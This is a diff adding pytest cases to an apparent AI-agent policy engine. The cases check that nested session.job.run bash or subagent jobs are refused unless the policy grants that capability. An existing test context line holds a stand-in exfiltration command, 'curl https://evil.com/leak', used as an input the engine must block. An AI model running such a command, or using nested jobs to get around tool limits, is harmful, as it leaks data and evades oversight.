@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import json
 from pathlib import Path
 
 import pytest
@@ -302,6 +303,42 @@ def test_policy_engine_recurses_into_session_job_run_commands(tmp_path: Path) ->
             params={
                 "jobs": [
                     {"kind": "bash", "cmd": "curl https://evil.com/leak", "cwd": str(allow_dir)}
+                ]
+            },
+        )
+
+
+def test_policy_engine_requires_shell_capability_for_session_job_run_bash_items() -> None:
+    """Subagent-only policy should not allow nested bash jobs through session.job.run."""
+
+    engine = PolicyEngine()
+    policy = _policy(
+        allowed_tools_json=json.dumps(["session.job.run", "subagent.run"], ensure_ascii=True),
+    )
+
+    with pytest.raises(PolicyViolationError, match="Tool is not allowed by policy: bash.exec"):
+        engine.ensure_tool_call_allowed(
+            policy=policy,
+            tool_name="session.job.run",
+            params={"jobs": [{"kind": "bash", "cmd": "echo hi", "cwd": "."}]},
+        )
+
+
+def test_policy_engine_requires_subagent_capability_for_session_job_run_subagent_items() -> None:
+    """Shell-only policy should not allow nested subagent jobs through session.job.run."""
+
+    engine = PolicyEngine()
+    policy = _policy(
+        allowed_tools_json=json.dumps(["bash.exec", "session.job.run"], ensure_ascii=True),
+    )
+
+    with pytest.raises(PolicyViolationError, match="Tool is not allowed by policy: subagent.run"):
+        engine.ensure_tool_call_allowed(
+            policy=policy,
+            tool_name="session.job.run",
+            params={
+                "jobs": [
+                    {"kind": "subagent", "prompt": "inspect", "subagent_name": "researcher"}
                 ]
             },
         )
